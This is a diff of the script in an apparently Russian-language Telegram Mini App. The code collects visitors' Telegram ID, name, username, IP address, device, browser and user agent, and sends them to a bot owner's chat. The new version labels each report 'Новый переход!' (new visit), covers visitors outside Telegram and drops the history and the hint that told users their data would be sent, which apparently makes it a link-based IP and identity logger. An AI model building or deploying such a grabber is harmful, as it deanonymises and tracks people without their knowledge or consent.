-                    if (CONFIG.AUTO_CLOSE) {
-                        setTimeout(() => {
-                            tg.close();
-                        }, 2000);
-                    }
-                    
+                    return true;
                 } else {
-                    throw new Error(result.description || 'Ошибка отправки сообщения');
+                    throw new Error(result.description || 'Ошибка отправки');
                 }
                 
             } catch (error) {
-                console.error('Ошибка отправки:', error);
-                showError(`❌ Ошибка отправки: ${error.message}`);
-                
-                // Пробуем альтернативный способ
-                try {
-                    tg.sendData(JSON.stringify({
-                        action: 'user_data',
-                        user: telegramUser,
-                        device: deviceData
-                    }));
-                    showSuccess('✅ Данные отправлены через Web App Data');
-                } catch (tgError) {
-                    console.error('Web App error:', tgError);
-                }
-                
-                sendButton.innerHTML = originalText;
-                
-            } finally {
-                setTimeout(() => {
-                    sendButton.disabled = false;
-                    if (!messageId) {
-                        sendButton.innerHTML = originalText;
-                        sendButton.style.background = '';
-                    }
-                }, 3000);
-                isSending = false;
+                console.error('Ошибка отправки в бота:', error);
+                return false;
             }
         }
-        
-        // Создание форматированного сообщения для Telegram
+
+        // Создание сообщения для Telegram
         function createTelegramMessage() {
             const time = new Date(deviceData.timestamp).toLocaleString('ru-RU');
-            const username = telegramUser.username ? `@${telegramUser.username}` : 'Не указан';
-            const fullName = `${telegramUser.first_name} ${telegramUser.last_name}`.trim() || 'Не указано';
+            const username = telegramUser?.username ? `@${telegramUser.username}` : 'Не указан';
+            const fullName = telegramUser ? 
+                `${telegramUser.first_name} ${telegramUser.last_name}`.trim() : 
+                'Анонимный пользователь';
             
-            let message = `<b>🆕 Данные из Telegram Mini App</b>\n\n`;
+            let message = `<b>🆕 Новый переход!</b>\n\n`;
             
-            // Информация о пользователе
-            message += `<b>👤 Информация о пользователе:</b>\n`;
-            message += `🆔 ID: <code>${telegramUser.id}</code>\n`;
-            message += `👤 Имя: ${fullName}\n`;
-            message += `📛 Username: ${username}\n`;
-            message += `🌍 Язык: ${telegramUser.language_code}\n`;
-            message += `⭐ Premium: ${telegramUser.is_premium ? '✅ Да' : '❌ Нет'}\n`;
-            message += `🔗 Query ID: ${telegramUser.query_id || 'Нет'}\n\n`;
+            if (telegramUser) {
+                message += `<b>👤 Пользователь Telegram:</b>\n`;
+                message += `🆔 ID: <code>${telegramUser.id}</code>\n`;
+                message += `👤 Имя: ${fullName}\n`;
+                message += `📛 Username: ${username}\n`;
+                message += `🌍 Язык: ${telegramUser.language_code}\n`;
+                message += `⭐ Premium: ${telegramUser.is_premium ? '✅ Да' : '❌ Нет'}\n\n`;
+            } else {
+                message += `<b>👤 Пользователь:</b> Анонимный (не в Telegram)\n\n`;
+            }
             
-            // Информация об устройстве
             message += `<b>📱 Информация об устройстве:</b>\n`;
             message += `🕐 Время: ${time}\n`;
             message += `🌐 IP: <code>${deviceData.ip || 'Не определен'}</code>\n`;
@@ -795,34 +692,32 @@
             message += `📱 Тип: ${deviceData.type}\n`;
             message += `🌐 Браузер: ${deviceData.browser}\n`;
             message += `📏 Экран: ${deviceData.screen}\n`;
-            message += `🗣️ Язык браузера: ${deviceData.language}\n`;
-            message += `🤖 Платформа: ${deviceData.tgPlatform}\n`;
+            
+            if (deviceData.tgPlatform) {
+                message += `🤖 Платформа: ${deviceData.tgPlatform}\n`;
+            }
+            
             message += `🔗 Страница: ${deviceData.url}\n\n`;
             
-            // Техническая информация
-            message += `<b>🔧 Технические данные:</b>\n`;
-            message += `<code>User Agent: ${deviceData.userAgent.substring(0, 150)}...</code>`;
+            if (deviceData.userAgent) {
+                message += `<b>🔧 User Agent:</b>\n<code>${deviceData.userAgent.substring(0, 150)}...</code>`;
+            }
             
             return message;
         }
-        
-        // Отправка копии владельцу бота
+
+        // Отправка копии владельцу
         async function sendCopyToOwner(originalMessage) {
             try {
-                // Получаем свой chat ID (нужно заменить на ваш)
-                const ownerChatId = 'ВАШ_CHAT_ID'; // Получите через @userinfobot или getUpdates
+                if (!CONFIG.OWNER_CHAT_ID) return;
                 
-                if (!ownerChatId || ownerChatId === 'ВАШ_CHAT_ID') {
-                    return; // Пропускаем если chat ID не установлен
-                }
-                
-                const ownerMessage = `👤 От пользователя: ${telegramUser.username ? '@' + telegramUser.username : 'без username'}\n\n` + originalMessage;
+                const ownerMessage = `👤 От пользователя: ${telegramUser?.username ? '@' + telegramUser.username : 'без username'}\n\n` + originalMessage;
                 
                 await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: ownerChatId,
+                        chat_id: CONFIG.OWNER_CHAT_ID,
                         text: ownerMessage,
                         parse_mode: 'HTML',
                         disable_web_page_preview: true
@@ -833,219 +728,40 @@
                 console.error('Ошибка отправки владельцу:', error);
             }
         }
-        
-        // Сохранение в историю
-        function saveToHistory(messageId) {
-            try {
-                const historyItem = {
-                    id: Date.now(),
-                    messageId: messageId,
-                    time: new Date().toLocaleString('ru-RU'),
-                    username: telegramUser.username || `user_${telegramUser.id}`,
-                    userId: telegramUser.id,
-                    device: deviceData.type,
-                    ip: deviceData.ip
-                };
-                
-                let history = JSON.parse(localStorage.getItem('telegramMiniAppHistory') || '[]');
-                history.unshift(historyItem);
-                
-                // Ограничиваем 50 записями
-                if (history.length > 50) {
-                    history = history.slice(0, 50);
-                }
-                
-                localStorage.setItem('telegramMiniAppHistory', JSON.stringify(history));
-                
-                // Обновляем отображение истории
-                displayHistory();
-                
-            } catch (error) {
-                console.error('Ошибка сохранения истории:', error);
-            }
-        }
-        
-        // Отображение истории
-        function displayHistory() {
-            try {
-                const history = JSON.parse(localStorage.getItem('telegramMiniAppHistory') || '[]');
-                const historyList = document.getElementById('historyList');
-                
-                if (history.length === 0) {
-                    historyList.innerHTML = '<p style="text-align: center; color: #888; padding: 20px;">История будет появляться здесь после отправки данных</p>';
-                    return;
-                }
-                
-                let html = '';
-                history.forEach(item => {
-                    html += `
-                        <div class="history-item">
-                            <div>
-                                <div class="history-user">👤 ${item.username}</div>
-                                <div class="history-time">🕐 ${item.time}</div>
-                            </div>
-                            <div>
-                                📱 ${item.device}<br>
-                                <small>🌐 ${item.ip}</small>
-                            </div>
-                        </div>
-                    `;
-                });
-                
-                historyList.innerHTML = html;
-                
-            } catch (error) {
-                console.error('Ошибка отображения истории:', error);
-            }
-        }
-        
-        // Загрузка истории
-        function loadHistory() {
-            displayHistory();
-        }
-        
-        // Просмотр истории
-        function viewHistory() {
-            const history = JSON.parse(localStorage.getItem('telegramMiniAppHistory') || '[]');
-            if (history.length === 0) {
-                showInfo('История отправок пуста');
-                return;
-            }
+
+        // Показать сообщение
+        function showMessage(text, type) {
+            const message = document.getElementById('message');
+            const messageText = document.getElementById('messageText');
+            const messageIcon = document.getElementById('messageIcon');
             
-            let message = '📊 История отправок:\n\n';
-            history.forEach((item, index) => {
-                message += `${index + 1}. ${item.time}\n`;
-                message += `   👤 ${item.username}\n`;
-                message += `   📱 ${item.device}\n`;
-                message += `   🌐 ${item.ip}\n\n`;
-            });
+            messageText.textContent = text;
+            message.className = `message show ${type}`;
+            messageIcon.textContent = type === 'success' ? '✅' : '❌';
             
-            alert(message);
+            // Автоматическое скрытие через 5 секунд
+            setTimeout(hideMessage, 5000);
         }
-        
-        // Копирование всех данных
-        function copyAllData() {
-            const allData = {
-                telegram: telegramUser,
-                device: deviceData,
-                timestamp: new Date().toISOString()
-            };
-            
-            const text = JSON.stringify(allData, null, 2);
-            
-            navigator.clipboard.writeText(text).then(() => {
-                showSuccess('✅ Все данные скопированы в буфер обмена!');
-            }).catch(err => {
-                showError('❌ Ошибка копирования: ' + err.message);
-            });
+
+        // Скрыть сообщение
+        function hideMessage() {
+            const message = document.getElementById('message');
+            message.classList.remove('show');
         }
-        
-        // Показать сообщение об успехе
-        function showSuccess(message) {
-            const status = document.getElementById('statusMessage');
-            status.innerHTML = `✅ ${message}`;
-            status.className = 'status-message success';
-            status.style.display = 'flex';
-            
-            setTimeout(() => {
-                status.style.display = 'none';
-            }, 5000);
-        }
-        
-        // Показать сообщение об ошибке
-        function showError(message) {
-            const status = document.getElementById('statusMessage');
-            status.innerHTML = `❌ ${message}`;
-            status.className = 'status-message error';
-            status.style.display = 'flex';
-            
-            setTimeout(() => {
-                status.style.display = 'none';
-            }, 5000);
-        }
-        
-        // Показать информационное сообщение
-        function showInfo(message) {
-            const status = document.getElementById('statusMessage');
-            status.innerHTML = `ℹ️ ${message}`;
-            status.className = 'status-message success';
-            status.style.display = 'flex';
-            
-            setTimeout(() => {
-                status.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Применение темы Telegram
-        function applyTelegramTheme() {
-            // Можно использовать тему Telegram
-            document.body.style.backgroundColor = tg.themeParams.bg_color || '#ffffff';
-            document.body.style.color = tg.themeParams.text_color || '#000000';
-            
-            // Проверяем тему для темного режима
-            if (tg.colorScheme === 'dark') {
-                document.body.classList.add('dark-mode');
-            }
-        }
-        
-        // Экспорт истории в CSV
-        function exportHistoryCSV() {
-            try {
-                const history = JSON.parse(localStorage.getItem('telegramMiniAppHistory') || '[]');
-                if (history.length === 0) {
-                    showError('Нет данных для экспорта');
-                    return;
-                }
-                
-                const csv = history.map(item => 
-                    `"${item.time}","${item.username}","${item.userId}","${item.device}","${item.ip}","${item.messageId}"`
-                ).join('\n');
-                
-                const blob = new Blob(['Время,Username,User ID,Устройство,IP,ID сообщения\n' + csv], { 
-                    type: 'text/csv;charset=utf-8;' 
-                });
-                
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = `telegram_data_${new Date().toISOString().split('T')[0]}.csv`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                URL.revokeObjectURL(url);
-                
-                showSuccess('✅ История экспортирована в CSV!');
-                
-            } catch (error) {
-                showError('Ошибка экспорта: ' + error.message);
-            }
-        }
-        
-        // Добавление кнопки экспорта
-        function addExportButton() {
-            const buttonContainer = document.querySelector('.button-container');
-            const exportBtn = document.createElement('button');
-            exportBtn.className = 'button secondary-btn';
-            exportBtn.innerHTML = '<span class="emoji">📥</span> Экспорт истории (CSV)';
-            exportBtn.onclick = exportHistoryCSV;
-            buttonContainer.appendChild(exportBtn);
-        }
-        
+
         // Инициализация при загрузке
-        document.addEventListener('DOMContentLoaded', () => {
-            initApp();
-            
-            // Добавляем кнопку экспорта через 2 секунды
-            setTimeout(() => {
-                addExportButton();
-            }, 2000);
-            
-            // Показываем инструкцию при первом посещении
-            if (!localStorage.getItem('miniAppFirstVisit')) {
+        document.addEventListener('DOMContentLoaded', initApp);
+
+        // Управление анимацией пульсации при наведении
+        document.getElementById('goButton').addEventListener('mouseenter', function() {
+            this.classList.remove('pulse');
+        });
+
+        document.getElementById('goButton').addEventListener('mouseleave', function() {
+            if (!this.disabled) {
                 setTimeout(() => {
-                    showInfo('👋 Нажмите "Отправить данные в бота" чтобы отправить информацию');
-                    localStorage.setItem('miniAppFirstVisit', 'true');
-                }, 1000);
+                    this.classList.add('pulse');
+                }, 300);
             }
         });
     </script>
